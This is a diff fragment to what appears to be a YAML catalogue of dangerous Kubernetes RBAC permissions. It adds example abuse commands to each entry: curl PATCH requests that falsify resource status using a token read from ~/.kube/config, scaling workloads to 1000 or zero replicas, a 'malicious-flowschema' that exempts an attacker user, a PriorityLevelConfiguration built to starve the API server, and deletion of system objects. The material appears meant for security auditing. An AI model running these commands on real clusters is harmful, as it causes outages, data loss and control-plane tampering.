+        # Example: curl -k -H "Authorization: Bearer $(cat ~/.kube/config | grep token: | awk '{print $2}')" -H "Content-Type: application/json" -X PATCH --data '{"status":{"conditions":[{"type":"Ready","status":"False","reason":"PolicyError","message":"Policy failed to apply due to internal error."}]}}' https://127.0.0.1:6443/apis/networking.k8s.io/v1/namespaces/default/networkpolicies/my-policy/status
 - id: 1094
   name: "Update PodDisruptionBudget Status (Namespace Tampering/DoS)"
   description: "Allows creating or updating the status of PodDisruptionBudget (PDB) objects within a namespace. This could be used to misrepresent the health or disruption allowance of workloads, potentially leading to unintended disruptions or bypassing availability safeguards."
@@ -1272,7 +2736,15 @@
   resources: ["poddisruptionbudgets/status"]
   verbs: ["create", "update", "patch"]
   tags: ["Tampering", "DenialOfService", "AvailabilityImpact"]
-
+  commands:
+    - description: "Patch a PodDisruptionBudget's status to misrepresent its health or allowed disruptions."
+      command: |
+        # Replace <kubernetes-api-server> with your API server address
+        # Replace <token> with your authentication token
+        curl -k -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -X PATCH \
+          --data '{"status":{"currentHealthy":0,"desiredHealthy":1,"disruptionsAllowed":0,"expectedPods":1}}' \
+          https://<kubernetes-api-server>/apis/policy/v1/namespaces/<namespace>/poddisruptionbudgets/<pdb-name>/status
+        # Example: curl -k -H "Authorization: Bearer $(cat ~/.kube/config | grep token: | awk '{print $2}')" -H "Content-Type: application/json" -X PATCH --data '{"status":{"currentHealthy":0,"desiredHealthy":1,"disruptionsAllowed":0,"expectedPods":1}}' https://127.0.0.1:6443/apis/policy/v1/namespaces/default/poddisruptionbudgets/my-pdb/status
 - id: 1095
   name: "Read ComponentStatuses (Control Plane Reconnaissance)"
   description: "Allows reading ComponentStatus objects, which show the health of control plane components like etcd, kube-scheduler, and kube-controller-manager. This can reveal operational weaknesses, vulnerabilities, or misconfigurations in the cluster's core."
@@ -1283,7 +2755,10 @@
   resources: ["componentstatuses"]
   verbs: ["get", "list"]
   tags: ["InformationDisclosure", "Reconnaissance", "ControlPlaneDisruption"]
-
+  commands:
+    - description: "List the health status of core Kubernetes components."
+      command: |
+        kubectl get componentstatuses
 - id: 1096
   name: "Update Deployment Scale (Resource Abuse/DoS)"
   description: "Allows updating the 'scale' subresource of Deployments within a namespace. This can be abused to significantly increase or decrease the number of replicas for a deployment, potentially leading to resource exhaustion, denial of service, or unexpected operational costs."
@@ -1300,7 +2775,15 @@
       "WorkloadLifecycle",
       "ResourceModification",
     ]
-
+  commands:
+    - description: "Scale a deployment to a very high number of replicas (resource exhaustion)."
+      command: |
+        kubectl scale deployment <deployment-name> -n <namespace> --replicas=1000
+        # Example: kubectl scale deployment my-web-app -n default --replicas=1000
+    - description: "Scale a deployment to zero replicas (denial of service)."
+      command: |
+        kubectl scale deployment <deployment-name> -n <namespace> --replicas=0
+        # Example: kubectl scale deployment my-api -n production --replicas=0
 - id: 1097
   name: "Update StatefulSet Scale (Resource Abuse/DoS)"
   description: "Allows updating the 'scale' subresource of StatefulSets within a namespace. This can be abused to significantly increase or decrease the number of replicas for a stateful application, potentially leading to resource exhaustion, denial of service, data inconsistencies, or unexpected operational costs."
@@ -1318,7 +2801,15 @@
       "ResourceModification",
       "DataLoss",
     ]
-
+  commands:
+    - description: "Scale a StatefulSet to a very high number of replicas (resource exhaustion)."
+      command: |
+        kubectl scale statefulset <statefulset-name> -n <namespace> --replicas=1000
+        # Example: kubectl scale statefulset my-database -n production --replicas=1000
+    - description: "Scale a StatefulSet to zero replicas (denial of service and potential data loss)."
+      command: |
+        kubectl scale statefulset <statefulset-name> -n <namespace> --replicas=0
+        # Example: kubectl scale statefulset my-redis -n default --replicas=0
 - id: 1098
   name: "Manage FlowSchemas (API Server DoS/Manipulation)"
   description: "Allows managing FlowSchema objects cluster-wide. FlowSchemas are part of API Priority and Fairness, controlling how API requests are categorized and prioritized. Misconfiguration can lead to denial of service against the API server for critical components or allow certain requests to bypass throttling, potentially overwhelming the server."
@@ -1330,7 +2821,32 @@
   verbs: ["create", "update", "patch", "delete"]
   tags:
     ["DenialOfService", "APIServerDoS", "Tampering", "ControlPlaneDisruption"]
-
+  commands:
+    - description: "Create a new FlowSchema to prioritize malicious traffic or starve legitimate traffic."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: flowcontrol.apiserver.k8s.io/v1beta2
+        kind: FlowSchema
+        metadata:
+          name: malicious-flowschema
+        spec:
+          matchingPrecedence: 10000 # High precedence
+          priorityLevelConfiguration:
+            name: exempt # Assuming an exempt priority level exists
+          rules:
+          - resourceRules:
+            - apiGroups: [""]
+              resources: ["pods"]
+              verbs: ["create"]
+            subjects:
+            - kind: User
+              name: <attacker-user>
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing FlowSchema, disrupting API priority and fairness."
+      command: |
+        kubectl delete flowschema <flowschema-name>
+        # Example: kubectl delete flowschema system-leader-election
 - id: 1099
   name: "Manage PriorityLevelConfigurations (API Server DoS/Manipulation)"
   description: "Allows managing PriorityLevelConfiguration objects cluster-wide. These are part of API Priority and Fairness, defining concurrency limits and queueing for API requests. Misconfiguration can lead to denial of service against the API server by starving critical requests or by setting unfair limits, impacting cluster stability."
@@ -1342,7 +2858,26 @@
   verbs: ["create", "update", "patch", "delete"]
   tags:
     ["DenialOfService", "APIServerDoS", "Tampering", "ControlPlaneDisruption"]
-
+  commands:
+    - description: "Create a new PriorityLevelConfiguration with extremely low concurrency limits (DoS)."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: flowcontrol.apiserver.k8s.io/v1beta2
+        kind: PriorityLevelConfiguration
+        metadata:
+          name: starve-api
+        spec:
+          type: Limited
+          limited:
+            assuredConcurrencyShares: 1
+            limitResponse:
+              type: Reject
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing PriorityLevelConfiguration, disrupting API server stability."
+      command: |
+        kubectl delete prioritylevelconfiguration <prioritylevelconfiguration-name>
+        # Example: kubectl delete prioritylevelconfiguration system-leader-election
 - id: 1100
   name: "Read CSINode Objects (Node & Storage Reconnaissance)"
   description: "Allows reading CSINode objects cluster-wide. These objects contain information about CSI drivers running on nodes, including driver names, node IDs, and sometimes topology keys. This can reveal details about the storage architecture and potentially vulnerable CSI driver versions or configurations."
@@ -1359,7 +2894,14 @@
       "NodeAccess",
       "StorageDetailsDisclosure",
     ]
-
+  commands:
+    - description: "List all CSINode objects in the cluster."
+      command: |
+        kubectl get csinodes
+    - description: "Get the YAML definition of a specific CSINode."
+      command: |
+        kubectl get csinode <csinode-name> -o yaml
+        # Example: kubectl get csinode minikube -o yaml
 - id: 1101
   name: "Read CSIStorageCapacities (Namespace Storage Reconnaissance)"
   description: "Allows reading CSIStorageCapacity objects, usually within a namespace. These objects provide information about the storage capacity available through CSI drivers for specific storage classes. This can help attackers understand storage limits and potentially identify underutilized or overallocated storage."
@@ -1370,7 +2912,15 @@
   resources: ["csistoragecapacities"]
   verbs: ["get", "list", "watch"]
   tags: ["InformationDisclosure", "Reconnaissance", "StorageDetailsDisclosure"]
-
+  commands:
+    - description: "List all CSIStorageCapacity objects in a specific namespace."
+      command: |
+        kubectl get csistoragecapacities -n <namespace>
+        # Example: kubectl get csistoragecapacities -n default
+    - description: "Get the YAML definition of a specific CSIStorageCapacity."
+      command: |
+        kubectl get csistoragecapacity <csistoragecapacity-name> -n <namespace> -o yaml
+        # Example: kubectl get csistoragecapacity my-storage-capacity -n default -o yaml
 - id: 1102
   name: "Manage VolumeAttachments (Cluster-wide Storage/Node Manipulation)"
   description: "Allows managing VolumeAttachment objects cluster-wide. VolumeAttachments link persistent volumes to nodes. Control over these can allow an attacker to detach volumes from nodes (DoS), potentially attach volumes to attacker-controlled nodes (data theft), or interfere with legitimate storage operations."
@@ -1389,7 +2939,14 @@
       "NodeAccess",
       "PotentialPrivilegeEscalation",
     ]
-
+  commands:
+    - description: "List all VolumeAttachments in the cluster."
+      command: |
+        kubectl get volumeattachments
+    - description: "Delete a VolumeAttachment, potentially detaching a volume and causing disruption."
+      command: |
+        kubectl delete volumeattachment <volumeattachment-name>
+        # Example: kubectl delete volumeattachment pvc-12345-node-minikube
 - id: 1103
   name: "Watch All Resources in a Namespace (Broad Information Disclosure)"
   description: "Allows using the 'watch' verb on all resources ('*') within a specific namespace. This provides an attacker with a real-time stream of all changes occurring to any resource in that namespace, offering extensive intelligence for further exploitation, understanding application behavior, or identifying sensitive data flows."
@@ -1406,3 +2963,8 @@
       "DataExposure",
       "WildcardPermission",
     ]
+  commands:
+    - description: "Watch all resource changes in a specific namespace in real-time."
+      command: |
+        kubectl get all -n <namespace> --watch
+        # Example: kubectl get all -n default --watch
